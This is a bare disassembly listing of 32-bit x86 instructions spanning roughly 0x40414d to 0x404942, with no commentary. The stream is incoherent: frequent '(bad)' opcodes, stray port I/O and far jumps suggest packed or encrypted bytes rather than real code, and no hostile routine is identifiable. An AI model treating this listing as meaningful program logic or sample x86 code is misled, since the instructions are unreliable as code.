  40414d:	xor    DWORD PTR [ecx+0x30],0x51
  404151:	xchg   BYTE PTR [ebp+ecx*8-0x2885656c],ah
  404158:	jno    0x4041d8
  40415a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40415b:	mov    al,ch
  40415d:	and    ch,BYTE PTR [edx]
  40415f:	xchg   DWORD PTR [ebp+ecx*4+0x2c31abae],ecx
  404166:	or     al,0x8c
  404168:	pusha  
  404169:	out    0x42,eax
  40416b:	pop    esp
  40416c:	pop    esi
  40416d:	les    edx,FWORD PTR [edi+0x21]
  404170:	imul   eax,DWORD PTR [ebx],0xffffffee
  404173:	test   eax,ebx
  404175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404176:	aaa    
  404177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404178:	(bad)  
  404179:	adc    BYTE PTR [eax+0x4a694745],bh
  40417f:	pop    esi
  404180:	cmp    DWORD PTR [ebx],edi
  404182:	mov    al,0x66
  404184:	jmp    0x25bc:0x981a3c75
  40418b:	imul   edi,DWORD PTR [ecx],0x25
  40418e:	aas    
  40418f:	imul   ecx,edi,0xab3f88d7
  404195:	arpl   WORD PTR [ebx-0x26],di
  404198:	call   0x865f:0xd095110b
  40419f:	mov    esp,0x27fd2734
  4041a4:	in     eax,0x7c
  4041a6:	call   0x9155:0x162fe5af
  4041ad:	sahf   
  4041ae:	gs dec ebp
  4041b0:	fisubr WORD PTR [ebx-0x3a]
  4041b3:	out    dx,al
  4041b4:	lea    edi,[eax-0x55bcc3a2]
  4041ba:	sub    al,0xfc
  4041bc:	(bad)  
  4041bd:	push   esi
  4041be:	push   0xffffff8a
  4041c0:	adc    edi,DWORD PTR [ebp-0x153ed28b]
  4041c6:	xor    dl,ah
  4041c8:	in     al,dx
  4041c9:	out    dx,eax
  4041ca:	xchg   edx,eax
  4041cb:	adc    eax,ebp
  4041cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ce:	shl    BYTE PTR [edi],cl
  4041d0:	jns    0x404234
  4041d2:	push   es
  4041d3:	je     0x40416c
  4041d5:	pop    edx
  4041d6:	lahf   
  4041d7:	inc    esi
  4041d8:	cdq    
  4041d9:	lds    ecx,FWORD PTR [edi+0x6]
  4041dc:	cmp    ebp,DWORD PTR [esi+0xb7b6c3a]
  4041e2:	daa    
  4041e3:	xchg   esp,eax
  4041e4:	pop    ecx
  4041e5:	and    ch,BYTE PTR [esp+edi*1]
  4041e8:	daa    
  4041e9:	adc    eax,DWORD PTR [ecx-0x34]
  4041ec:	aam    0xe7
  4041ee:	mov    gs,esp
  4041f0:	mov    BYTE PTR fs:[esi],dl
  4041f3:	pop    es
  4041f4:	dec    edi
  4041f5:	dec    esp
  4041f6:	repz fs mov bx,0x15c0
  4041fc:	into   
  4041fd:	fs xor esp,eax
  404200:	jbe    0x404240
  404202:	aas    
  404203:	mov    ah,ah
  404205:	shr    edx,1
  404207:	dec    edi
  404208:	mov    ds:0x11722ddf,al
  40420d:	add    DWORD PTR [eax+ecx*4],edi
  404210:	xchg   DWORD PTR [ecx-0x37],ecx
  404213:	inc    esp
  404214:	sti    
  404215:	jp     0x4041fc
  404217:	pop    edi
  404218:	mov    ch,0x6f
  40421a:	xchg   ebp,eax
  40421b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40421c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40421d:	inc    esp
  40421e:	repz push eax
  404220:	dec    edi
  404221:	enter  0x4f47,0x67
  404225:	jns    0x40421a
  404227:	and    BYTE PTR [ecx-0x3805db7],dh
  40422d:	leave  
  40422e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40422f:	mov    al,0x58
  404231:	shl    BYTE PTR [eax+0x78ebda96],0x6c
  404238:	mov    dh,0x10
  40423a:	jnp    0x4041fd
  40423c:	sbb    eax,0x175e19dc
  404241:	imul   esp,DWORD PTR [ecx-0x3ab63776],0xffffffcb
  404248:	out    dx,eax
  404249:	int3   
  40424a:	jae    0x404244
  40424c:	fs stos BYTE PTR es:[edi],al
  40424e:	ds or  BYTE PTR ds:[esi],bl
  404252:	adc    DWORD PTR [ebp-0x56],ebx
  404255:	repz mov ecx,0xe9c84689
  40425b:	mov    dh,al
  40425d:	jo     0x404289
  40425f:	ds sahf 
  404261:	mov    esp,0xa0dc6b8b
  404266:	push   esp
  404267:	sub    BYTE PTR [edi],0xf3
  40426a:	(bad)  
  40426b:	std    
  40426c:	pop    ecx
  40426d:	mov    BYTE PTR [edx+eax*1],ah
  404270:	ins    DWORD PTR es:[edi],dx
  404271:	pop    edi
  404272:	imul   BYTE PTR [edi+eiz*8]
  404275:	add    al,0x52
  404277:	mov    cl,0x6e
  404279:	mov    dl,BYTE PTR [edi]
  40427b:	jae    0x40424e
  40427d:	shl    DWORD PTR [esi],1
  40427f:	xor    DWORD PTR [ebp+eax*4+0x68],0x7a5752e2
  404287:	jbe    0x404263
  404289:	pop    edx
  40428a:	and    BYTE PTR [edx-0x735aebf7],ah
  404290:	pop    ecx
  404291:	jns    0x4042b6
  404293:	popf   
  404294:	mov    edi,DWORD PTR [ebp-0x19]
  404297:	and    al,0xdc
  404299:	jmp    0x67f45174
  40429e:	das    
  40429f:	ins    BYTE PTR es:[edi],dx
  4042a0:	out    0x3b,eax
  4042a2:	ficomp WORD PTR [esi+ebx*2+0x6]
  4042a6:	int    0xb8
  4042a8:	xor    esp,eax
  4042aa:	and    ch,BYTE PTR [edx+0x72]
  4042ad:	ror    esp,cl
  4042af:	cli    
  4042b0:	mov    ebx,0x1ab225ee
  4042b5:	scas   al,BYTE PTR es:[edi]
  4042b6:	mov    esi,0xd1a64ee
  4042bb:	mov    dl,0xb
  4042bd:	xchg   DWORD PTR [esi-0x7f27740e],edi
  4042c3:	es xor eax,0x4bafdfdd
  4042c9:	(bad)  
  4042ca:	out    0xdd,eax
  4042cc:	popf   
  4042cd:	addr16 aas 
  4042cf:	out    0xe2,al
  4042d1:	dec    ecx
  4042d2:	fild   WORD PTR [ebx+0x1b433b95]
  4042d8:	xor    DWORD PTR [esi],eax
  4042da:	xchg   ecx,eax
  4042db:	stc    
  4042dc:	arpl   bx,ax
  4042de:	lods   eax,DWORD PTR ds:[esi]
  4042df:	xor    BYTE PTR [edi+0x3d],0xd
  4042e3:	sbb    DWORD PTR [edx-0x52],ebx
  4042e6:	adc    ah,dl
  4042e8:	mov    eax,ds:0xae518ac3
  4042ed:	push   edi
  4042ee:	(bad)  
  4042ef:	ja     0x4042b5
  4042f1:	ins    BYTE PTR es:[edi],dx
  4042f2:	rol    BYTE PTR [ecx-0x18],0x0
  4042f6:	sub    DWORD PTR [ecx-0x7daf70e],edx
  4042fc:	lods   al,BYTE PTR ds:[esi]
  4042fd:	popf   
  4042fe:	xchg   edi,eax
  4042ff:	aas    
  404300:	in     eax,dx
  404301:	es mov esp,0xb2ffdc5e
  404307:	jmp    0x6a32:0xdc8cd15a
  40430e:	jle    0x4042be
  404310:	inc    edi
  404311:	pop    edx
  404312:	les    edx,FWORD PTR [eax-0x5a05466]
  404318:	sub    al,0xa9
  40431a:	xchg   BYTE PTR ds:0x58ba80d5,cl
  404320:	pop    esp
  404321:	cmp    ch,al
  404323:	push   ds
  404324:	jmp    0x434a99a1
  404329:	bound  edi,QWORD PTR [esi+esi*8+0xd192f0d]
  404330:	dec    ebp
  404331:	dec    ebp
  404332:	mov    WORD PTR [esi+0x3016f10b],?
  404338:	pop    ecx
  404339:	push   ss
  40433a:	lock fst QWORD PTR [ebx+esi*8-0x4e8bd934]
  404342:	sbb    BYTE PTR [eax],cl
  404344:	and    BYTE PTR [esi+0x1e064182],ah
  40434a:	or     BYTE PTR ds:0xdf417512,0xb6
  404351:	aas    
  404352:	in     al,0x85
  404354:	add    eax,0x1b592772
  404359:	xchg   ebx,eax
  40435a:	pop    ebx
  40435b:	xchg   ebx,eax
  40435c:	lods   al,BYTE PTR ds:[esi]
  40435d:	and    al,0xb0
  40435f:	jo     0x4043b4
  404361:	loopne 0x404348
  404363:	mov    edx,0x418afd50
  404368:	and    cl,BYTE PTR [ebx-0x2f]
  40436b:	inc    ebp
  40436c:	pop    ebp
  40436d:	sar    DWORD PTR [edx],0xae
  404370:	sub    bl,ah
  404372:	push   esi
  404373:	pop    edi
  404374:	fsubr  st(5),st
  404376:	lods   al,BYTE PTR ds:[esi]
  404377:	aam    0x92
  404379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40437a:	sbb    edi,edx
  40437c:	pop    ebp
  40437d:	jle    0x4043d4
  40437f:	int3   
  404380:	in     eax,dx
  404381:	rcr    edi,0x7e
  404384:	add    esp,DWORD PTR [edx-0xf780860]
  40438a:	adc    esi,DWORD PTR [ebp-0x13]
  40438d:	sbb    cl,BYTE PTR [edi+0x41cb62ed]
  404393:	shr    DWORD PTR [eax],1
  404395:	outs   dx,DWORD PTR ds:[esi]
  404396:	inc    ecx
  404397:	fidivr WORD PTR [eax]
  404399:	shl    BYTE PTR [eax],0x25
  40439c:	pop    esi
  40439d:	mov    DWORD PTR [esi+0x2],ebp
  4043a0:	sar    DWORD PTR [esi+0x22c3835d],1
  4043a6:	gs out 0xfc,eax
  4043a9:	and    ecx,DWORD PTR [edx+0x8169a2b]
  4043af:	cld    
  4043b0:	in     eax,dx
  4043b1:	cmp    al,0x3f
  4043b3:	mov    edx,0xc449c2b4
  4043b8:	jg     0x404365
  4043ba:	imul   edi,ecx,0xe568554c
  4043c0:	and    BYTE PTR [ecx-0x438557f3],dh
  4043c6:	test   DWORD PTR [esi+0x457a247f],edx
  4043cc:	xchg   edx,eax
  4043cd:	loop   0x40443d
  4043cf:	out    dx,al
  4043d0:	cdq    
  4043d1:	int3   
  4043d2:	lods   al,BYTE PTR ds:[esi]
  4043d3:	addr16 inc edi
  4043d5:	fidivr WORD PTR [edi+0x3d]
  4043d8:	cld    
  4043d9:	aaa    
  4043da:	(bad)  
  4043db:	fmul   st,st(7)
  4043dd:	bound  ecx,QWORD PTR [ebp+0x4290435c]
  4043e3:	cmc    
  4043e4:	add    al,0x5b
  4043e6:	add    eax,0x2fe3d098
  4043eb:	int    0xb8
  4043ed:	xor    eax,0xcc43318b
  4043f2:	inc    esi
  4043f3:	pushf  
  4043f4:	mov    ebp,0x8fde0df4
  4043f9:	mov    esi,0x827bb852
  4043fe:	adc    DWORD PTR [ebx-0x25],esp
  404401:	lea    ebx,[ebx+0x7cc70fc8]
  404407:	inc    eax
  404408:	xor    dl,BYTE PTR [edx]
  40440a:	inc    edi
  40440b:	jge    0x40446f
  40440d:	xchg   edi,eax
  40440e:	mov    al,ds:0x7bfe344f
  404413:	adc    ecx,edx
  404415:	pushf  
  404416:	push   es
  404417:	dec    ebp
  404418:	jbe    0x40442f
  40441a:	pusha  
  40441b:	cs icebp 
  40441d:	add    dh,BYTE PTR [edx+0x31a93b5a]
  404423:	push   eax
  404424:	dec    edx
  404425:	dec    cx
  404427:	fimul  WORD PTR [esi+0x67]
  40442a:	adc    WORD PTR [eax],dx
  40442d:	pop    esi
  40442e:	sub    al,0x94
  404430:	push   ecx
  404431:	xor    al,0x37
  404433:	in     eax,0xdf
  404435:	sub    al,dl
  404437:	rol    bl,1
  404439:	dec    ecx
  40443a:	xor    edx,DWORD PTR [esi+0xc7cc80c]
  404440:	inc    edi
  404441:	ret    0x4822
  404444:	arpl   WORD PTR [eax+esi*2+0x33],cx
  404448:	data16 (bad) 
  40444a:	sub    al,0x36
  40444c:	in     eax,0xaa
  40444e:	xchg   edi,eax
  40444f:	rcl    BYTE PTR [ebp-0x66],cl
  404452:	retf   
  404453:	cdq    
  404454:	in     al,0x32
  404456:	jl     0x4044be
  404458:	sub    esp,eax
  40445a:	hlt    
  40445b:	call   0xf24c:0x11ae72e1
  404462:	shrd   DWORD PTR [esi-0x5a9d82cd],eax,cl
  404469:	mov    ecx,DWORD PTR [edx+esi*4+0x11]
  40446d:	sbb    DWORD PTR [edi-0x6eaeab20],esp
  404473:	int3   
  404474:	das    
  404475:	mov    bh,0x6b
  404477:	add    DWORD PTR [ecx-0x7009c814],esi
  40447d:	out    0x96,al
  40447f:	inc    ecx
  404480:	and    esi,DWORD PTR [edx+0xd459d5e]
  404486:	ins    BYTE PTR es:[edi],dx
  404487:	sbb    bl,BYTE PTR [ecx]
  404489:	bnd js 0x404466
  40448c:	or     eax,0xce842f0f
  404491:	inc    ebp
  404492:	addr16 out 0xe7,al
  404495:	inc    eax
  404496:	mov    eax,ds:0x2688745f
  40449b:	out    0x40,al
  40449d:	test   DWORD PTR [esi],ebx
  40449f:	mov    edx,0xdaf5986d
  4044a4:	jmp    0x3bdbef8c
  4044a9:	lea    eax,[ebp-0x39525bc0]
  4044af:	cmc    
  4044b0:	(bad)
  4044b3:	ds adc eax,0x6ef5a735
  4044b9:	fdivr  DWORD PTR [esi]
  4044bb:	lods   al,BYTE PTR ds:[esi]
  4044bc:	inc    esi
  4044bd:	gs test esi,eax
  4044c0:	loopne 0x40452a
  4044c2:	iret   
  4044c3:	arpl   WORD PTR [ecx-0x56eae669],cx
  4044c9:	ret    0xd70a
  4044cc:	jge    0x404477
  4044ce:	inc    eax
  4044cf:	pop    ss
  4044d0:	pop    esi
  4044d1:	sub    eax,0xd4ec45f6
  4044d6:	ss mov ah,0x3b
  4044d9:	add    BYTE PTR [eax-0x791fd0d7],bh
  4044df:	inc    edx
  4044e0:	jnp    0x404474
  4044e2:	hlt    
  4044e3:	xchg   edx,eax
  4044e4:	pop    ebx
  4044e5:	(bad)  
  4044e6:	and    BYTE PTR [ebp+edx*1-0x2c],dl
  4044ea:	xor    BYTE PTR [ecx+0x7c],dl
  4044ed:	in     al,dx
  4044ee:	loope  0x404535
  4044f0:	inc    edi
  4044f1:	xchg   DWORD PTR [eax-0x27a4a8ba],esp
  4044f7:	fsubr  DWORD PTR [ecx+esi*2]
  4044fa:	ja     0x4044a8
  4044fc:	jae    0x404523
  4044fe:	fnstsw WORD PTR [ecx-0x74]
  404501:	fdiv   QWORD PTR [esp+ecx*1]
  404504:	popa   
  404505:	mov    ebx,0xed29842f
  40450a:	and    DWORD PTR [edx+0x7057cb29],edx
  404510:	sbb    al,0x41
  404512:	lds    edi,FWORD PTR [eax]
  404514:	inc    edx
  404515:	test   eax,0x3864aa4b
  40451a:	pop    eax
  40451b:	inc    BYTE PTR [edx+0x71]
  40451e:	push   ds
  40451f:	sub    eax,0x8c83a47f
  404524:	icebp  
  404525:	fld1   
  404527:	mov    ah,BYTE PTR [ebx-0xd40aec1]
  40452d:	adc    al,0xc7
  40452f:	add    dl,BYTE PTR [edx+0x7932f479]
  404535:	or     bl,dl
  404537:	add    ah,BYTE PTR [esi]
  404539:	and    eax,0x3787c3f
  40453e:	ins    DWORD PTR es:[edi],dx
  40453f:	mov    cl,0x46
  404541:	sub    DWORD PTR es:[esi+0x48bd4052],esp
  404548:	cmp    al,0x84
  40454a:	arpl   WORD PTR [eax],ax
  40454c:	push   ecx
  40454d:	xor    edi,esi
  40454f:	(bad)  
  404551:	mov    ecx,0xbe6b8fe6
  404556:	lods   al,BYTE PTR ds:[esi]
  404557:	add    eax,0x33514892
  40455c:	mov    ch,0x59
  40455e:	imul   BYTE PTR [ecx+0x54]
  404561:	sti    
  404562:	dec    edi
  404563:	ins    BYTE PTR es:[edi],dx
  404564:	out    0xdd,al
  404566:	(bad)  
  404567:	ja     0x404541
  404569:	jb     0x40452c
  40456b:	sahf   
  40456c:	cs mov esi,cs
  40456f:	push   ebx
  404570:	shl    DWORD PTR ds:0xc1b642ca,cl
  404576:	mov    al,0x64
  404578:	pop    esi
  404579:	out    0x16,eax
  40457b:	mov    edi,0x8ddc8312
  404580:	lods   al,BYTE PTR ds:[esi]
  404581:	adc    eax,0x5a3ec3e8
  404586:	sub    ch,bl
  404588:	jg     0x404576
  40458a:	cld    
  40458b:	cdq    
  40458c:	(bad)  
  40458d:	cmp    bh,BYTE PTR [ecx]
  40458f:	cdq    
  404590:	mov    bh,0xbb
  404592:	xchg   BYTE PTR [eax-0x7],al
  404595:	pop    es
  404596:	aad    0x0
  404598:	dec    eax
  404599:	fld    TBYTE PTR [ebp-0x3b5048a4]
  40459f:	cmp    eax,0x3d97ccb0
  4045a4:	daa    
  4045a5:	jmp    0x8f1d:0x5bd48d61
  4045ac:	adc    eax,0x5515a92e
  4045b1:	xor    bh,cl
  4045b3:	fmul   DWORD PTR [edx]
  4045b5:	int3   
  4045b6:	inc    al
  4045b8:	arpl   WORD PTR [ebx],si
  4045ba:	test   BYTE PTR [esi-0x32],bh
  4045bd:	jg     0x404540
  4045bf:	test   al,0x4c
  4045c1:	(bad)  
  4045c2:	dec    esp
  4045c3:	arpl   WORD PTR [ecx],dx
  4045c5:	sub    bh,BYTE PTR ds:0xfc5fcdf4
  4045cb:	mov    edx,0x87be651
  4045d0:	fnstenv [ebx+0x10]
  4045d3:	dec    edx
  4045d4:	inc    esp
  4045d5:	bound  esi,QWORD PTR [edx+0x47cf98c1]
  4045db:	xor    DWORD PTR [ebp-0x22],ebx
  4045de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045df:	cmp    BYTE PTR [edx],ah
  4045e1:	mov    ah,BYTE PTR [ecx+0x41c5521b]
  4045e7:	addr16 rcr al,1
  4045ea:	push   cs
  4045eb:	pushf  
  4045ec:	ds mov bl,0xba
  4045ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f0:	lds    esp,FWORD PTR [esi]
  4045f2:	mov    edi,0x26a7110d
  4045f7:	idiv   ebx
  4045f9:	cmp    ch,ch
  4045fb:	xlat   BYTE PTR ds:[ebx]
  4045fc:	shl    DWORD PTR [ebp-0x58],0xd7
  404600:	jmp    0x982:0x409b5564
  404607:	dec    edi
  404608:	add    BYTE PTR [esi-0x6f457cd7],cl
  40460e:	mov    bl,dh
  404610:	mov    ch,0xf8
  404612:	xchg   BYTE PTR [ebp+0x7bb26035],ah
  404618:	(bad)  
  404619:	mov    ds:0x1b88ce97,al
  40461e:	jae    0x4045cf
  404620:	add    al,0x15
  404622:	repz push ds
  404624:	or     al,0x86
  404626:	cli    
  404627:	push   ebx
  404628:	fbld   TBYTE PTR [edx+0x28]
  40462b:	jg     0x4046ab
  40462d:	(bad)  
  40462f:	inc    esp
  404630:	scas   al,BYTE PTR es:[edi]
  404631:	enter  0x39fd,0x93
  404635:	test   BYTE PTR ds:0x23e480a0,dl
  40463b:	ficom  WORD PTR [eax]
  40463d:	shr    DWORD PTR [ecx-0x3a],cl
  404640:	xchg   edi,eax
  404641:	bound  ebp,QWORD PTR [edi-0xf]
  404644:	cs aas 
  404646:	jo     0x404607
  404648:	into   
  404649:	jne    0x40461b
  40464b:	gs stos DWORD PTR es:[edi],eax
  40464d:	(bad)  
  40464e:	out    0x5,eax
  404650:	adc    ah,BYTE PTR [edx-0x49]
  404653:	loopne 0x40468c
  404655:	xchg   edi,eax
  404656:	adc    DWORD PTR [ecx-0x571592b],0x98dffaad
  404660:	mov    esi,0x7f9bfce0
  404665:	cmp    ecx,ecx
  404667:	rcl    ch,1
  404669:	lods   al,BYTE PTR ds:[esi]
  40466a:	enter  0xc0ce,0x19
  40466e:	jnp    0x40463f
  404670:	fwait
  404671:	pop    eax
  404672:	out    dx,al
  404673:	sub    DWORD PTR [edi-0x1c],edx
  404676:	or     BYTE PTR [ecx],bh
  404678:	je     0x4046ee
  40467a:	mov    ebp,0xfe6e8577
  40467f:	xchg   ebp,ebp
  404681:	jmp    0x404603
  404683:	sub    bl,BYTE PTR [edi-0x19]
  404686:	dec    edi
  404687:	ret    0xd47b
  40468a:	stos   BYTE PTR es:[edi],al
  40468b:	rcl    edx,1
  40468d:	(bad)  
  40468e:	or     ebx,esp
  404690:	push   ecx
  404691:	fnsave [ebx-0x49472ebc]
  404697:	and    eax,0x66a0c0b3
  40469c:	mov    ds:0x3230da0e,eax
  4046a1:	jecxz  0x40466a
  4046a3:	ins    DWORD PTR es:[edi],dx
  4046a4:	inc    eax
  4046a5:	nop
  4046a6:	sbb    al,0xe1
  4046a8:	lods   eax,DWORD PTR ds:[esi]
  4046a9:	xor    bl,BYTE PTR [edx+0x1c]
  4046ac:	jae    0x4046e8
  4046ae:	push   es
  4046af:	das    
  4046b0:	jns    0x404690
  4046b2:	fnstcw WORD PTR [ebx]
  4046b4:	sub    al,BYTE PTR [eax+0x3e]
  4046b7:	sbb    bh,bh
  4046b9:	pusha  
  4046ba:	mov    eax,0xdf49ca9f
  4046bf:	jno    0x404697
  4046c1:	adc    esp,DWORD PTR [esi-0x74]
  4046c4:	retf   0x87b0
  4046c7:	mov    dl,0xb4
  4046c9:	and    DWORD PTR [ecx],eax
  4046cb:	xchg   BYTE PTR [edi+0x77cd2675],dh
  4046d1:	lods   eax,DWORD PTR ds:[esi]
  4046d2:	fistp  DWORD PTR [eax]
  4046d4:	mov    bl,BYTE PTR [eax+edi*8-0x4c5a3733]
  4046db:	in     al,0x72
  4046dd:	repz add eax,0x8452b51e
  4046e3:	retf   
  4046e4:	xchg   BYTE PTR [edx-0x1c],ch
  4046e7:	jg     0x4046cf
  4046e9:	add    dh,BYTE PTR [ebx]
  4046eb:	es ror bh,cl
  4046ee:	mov    BYTE PTR [eax+ebp*1],cl
  4046f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046f2:	(bad)  
  4046f3:	fcmovnu st,st(7)
  4046f5:	(bad)  
  4046f8:	ficom  DWORD PTR [esi+eiz*8]
  4046fb:	das    
  4046fc:	cli    
  4046fd:	pop    esi
  4046fe:	inc    ebx
  4046ff:	fisttp QWORD PTR [eax]
  404701:	push   0x6b7d369e
  404706:	sbb    bl,BYTE PTR ds:0x6fc5da9d
  40470c:	ror    BYTE PTR [ecx],1
  40470e:	dec    ebx
  40470f:	jae    0x4046d9
  404711:	leave  
  404712:	inc    ecx
  404713:	ds dec edi
  404715:	sbb    al,0x32
  404717:	call   0x55898b19
  40471c:	xor    eax,0x1ccfcf18
  404721:	mov    edx,0xb75310dd
  404726:	fwait
  404727:	popa   
  404728:	leave  
  404729:	mov    eax,0xf9406a45
  40472e:	es iret 
  404730:	out    dx,al
  404731:	push   es
  404732:	ds ret 
  404734:	jbe    0x40473f
  404736:	ds mov dh,bl
  404739:	jnp    0x40474b
  40473b:	pop    eax
  40473c:	adc    ebx,DWORD PTR ss:[ecx]
  40473f:	imul   edx,edi,0x6e
  404742:	(bad)  
  404743:	dec    DWORD PTR [ecx-0x4a6d0029]
  404749:	fsub   DWORD PTR [ecx]
  40474b:	jmp    0xde1b:0xbe7ddc9b
  404752:	add    eax,0xce712035
  404757:	leave  
  404758:	inc    eax
  404759:	fcom   st(6)
  40475b:	(bad)  
  40475c:	loop   0x4047b7
  40475e:	push   ecx
  40475f:	fbld   TBYTE PTR [edi-0x13a5ba0c]
  404765:	jnp    0x40478e
  404767:	jl     0x4046fd
  404769:	jns    0x4047ca
  40476b:	adc    esp,DWORD PTR gs:[eax]
  40476e:	mov    ch,0xfb
  404770:	push   es
  404771:	xor    al,0x6f
  404773:	out    dx,al
  404774:	fbld   TBYTE PTR [edx+0x7e9a790a]
  40477a:	jbe    0x4047c0
  40477c:	or     eax,0x25bb6e4d
  404781:	sub    ah,BYTE PTR [ecx]
  404783:	ss leave 
  404785:	das    
  404786:	fs xchg edx,eax
  404788:	(bad)  
  404789:	ror    DWORD PTR [eax],cl
  40478b:	sub    eax,0x6a84d311
  404790:	inc    esi
  404791:	lahf   
  404792:	push   ds
  404793:	in     eax,0xac
  404795:	inc    ebx
  404796:	ficomp WORD PTR [esi+eax*4]
  404799:	(bad)  
  40479a:	mov    eax,0xd385c123
  40479f:	jmp    0x40481b
  4047a1:	dec    ebp
  4047a2:	sbb    DWORD PTR ds:0x30b873cd,0x78309086
  4047ac:	mov    WORD PTR [ebp-0x70d1c4e6],gs
  4047b2:	adc    ah,BYTE PTR [edi+0x2b26a310]
  4047b8:	addr16 cmc 
  4047ba:	retf   0xf0b1
  4047bd:	ja     0x404820
  4047bf:	jns    0x404828
  4047c1:	ds jecxz 0x404770
  4047c4:	adc    al,0x20
  4047c6:	push   es
  4047c7:	fs add al,0xfc
  4047ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047cc:	add    ecx,0xb2eac353
  4047d2:	call   0x683e3d47
  4047d7:	dec    ebp
  4047d8:	nop
  4047d9:	sub    ch,BYTE PTR [ebx]
  4047db:	das    
  4047dc:	retf   
  4047dd:	push   ss
  4047de:	xlat   BYTE PTR ds:[ebx]
  4047df:	mov    al,ds:0xf907e2b5
  4047e4:	jecxz  0x40479e
  4047e6:	es and eax,0x74ddfae6
  4047ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ed:	pop    esi
  4047ee:	call   0xc8a340f1
  4047f3:	cmp    al,0x9c
  4047f6:	ret    0xbfd3
  4047f9:	push   ebp
  4047fa:	test   eax,0x930514ed
  4047ff:	jno    0x404792
  404801:	and    al,0x4f
  404803:	mov    ebp,0xeca40050
  404808:	or     ch,BYTE PTR [ebp-0xfc38a4b]
  40480e:	cmp    dh,BYTE PTR [ebx-0x21e5604b]
  404814:	inc    edi
  404815:	xor    eax,0xb1767d01
  40481a:	fwait
  40481b:	ss xchg ebx,eax
  40481d:	fld    DWORD PTR [ecx+edi*4-0x6dd0264a]
  404824:	hlt    
  404825:	lea    esi,[edx+eax*1-0x55]
  404829:	jo     0x4047ab
  40482b:	and    cl,BYTE PTR [edx]
  40482d:	jecxz  0x4047ed
  40482f:	ja     0x4047e2
  404831:	scas   eax,DWORD PTR es:[edi]
  404832:	sub    ecx,esi
  404834:	jecxz  0x404843
  404836:	popf   
  404837:	inc    ebx
  404838:	fsubr  DWORD PTR [edi-0x4d]
  40483b:	jb     0x40486a
  40483d:	ja     0x40480a
  40483f:	cmp    eax,0x76e48647
  404844:	outs   dx,DWORD PTR ds:[esi]
  404845:	loop   0x404858
  404847:	add    eax,eax
  404849:	(bad)  
  40484a:	mov    esi,0x2d017fa2
  40484f:	jo     0x40485e
  404851:	jle    0x40484a
  404853:	test   BYTE PTR [edi-0x30035c1],dh
  404859:	pop    ss
  40485a:	enter  0xc7c1,0xf4
  40485e:	ds pop ds
  404860:	std    
  404861:	test   DWORD PTR [eax+0x1f15bf34],ebp
  404867:	add    al,0x76
  404869:	inc    esi
  40486a:	gs mov bh,0xee
  40486d:	aas    
  40486e:	push   esp
  40486f:	lahf   
  404870:	stc    
  404871:	ins    BYTE PTR es:[edi],dx
  404872:	mov    ah,0x38
  404874:	and    DWORD PTR [ecx+0x48c57e6f],ecx
  40487a:	inc    edi
  40487b:	in     al,0x27
  40487d:	jns    0x404874
  40487f:	mov    esi,0xf1e5905e
  404884:	jne    0x4048bf
  404886:	and    ch,cl
  404888:	jae    0x404895
  40488a:	mov    dl,0x18
  40488c:	in     eax,0xf1
  40488e:	outs   dx,DWORD PTR ds:[esi]
  40488f:	aad    0xba
  404891:	cli    
  404892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404893:	ret    0x8e62
  404896:	xor    ecx,DWORD PTR [edx+edx*8-0x73]
  40489a:	and    edi,DWORD PTR [edi-0x52]
  40489d:	xchg   dh,cl
  40489f:	push   0x1e
  4048a1:	mov    edi,0x9700bd9c
  4048a6:	ficom  WORD PTR [edi+0x54]
  4048a9:	pop    esi
  4048aa:	fnstsw WORD PTR ds:0xc5a69afa
  4048b0:	push   es
  4048b1:	and    eax,0xb4fc1c36
  4048b6:	push   es
  4048b7:	sbb    cl,al
  4048b9:	mov    dl,0x88
  4048bb:	and    bl,BYTE PTR [edi-0x2ca308c3]
  4048c1:	sbb    BYTE PTR [ebp+edx*1+0x19e150b8],dh
  4048c8:	jo     0x404863
  4048ca:	pop    eax
  4048cb:	call   0x258d7b17
  4048d0:	cmp    dh,BYTE PTR [edi+0x3c]
  4048d3:	adc    BYTE PTR [esp+ebx*8-0xe32085a],bh
  4048da:	dec    esi
  4048db:	(bad)  
  4048dc:	pop    ebx
  4048dd:	in     al,0x8f
  4048df:	push   ss
  4048e0:	push   es
  4048e1:	stc    
  4048e2:	xchg   BYTE PTR [ecx+0x29],dh
  4048e5:	adc    eax,0xb3e80900
  4048ea:	xchg   DWORD PTR [edx+0x54],esi
  4048ed:	xor    al,0x27
  4048ef:	sbb    eax,0x35555580
  4048f4:	mov    ebp,0x5797d2d8
  4048f9:	add    al,0x7d
  4048fb:	and    DWORD PTR [edx],0xffffffa9
  4048fe:	add    DWORD PTR [ecx+0x7f812ea7],edx
  404904:	dec    esi
  404905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404906:	jb     0x40497c
  404908:	xor    esp,DWORD PTR [edx]
  40490a:	test   al,0xb7
  40490c:	xchg   ebp,eax
  40490d:	xchg   ecx,eax
  40490e:	rol    DWORD PTR [eax+0x76c33a01],0x9c
  404915:	xor    esp,DWORD PTR [edx]
  404917:	bound  edi,QWORD PTR [ebx+ebx*4+0x549c0e88]
  40491e:	push   esp
  40491f:	fisubr WORD PTR [esi+0x21]
  404922:	and    DWORD PTR [eax-0x68],esi
  404925:	cld    
  404926:	inc    eax
  404927:	inc    edi
  404928:	aad    0x31
  40492a:	pop    ss
  40492b:	mov    eax,0x2f09c267
  404930:	pop    ss
  404931:	jle    0x4048ee
  404933:	test   BYTE PTR [ebx+0x5f2c168f],0x25
  40493a:	mov    dh,0x80
  40493c:	hlt    
  40493d:	push   es
  40493e:	mov    ecx,es
  404940:	loopne 0x404947
  404942:	cmp    al,BYTE PTR [ebx+0x57]
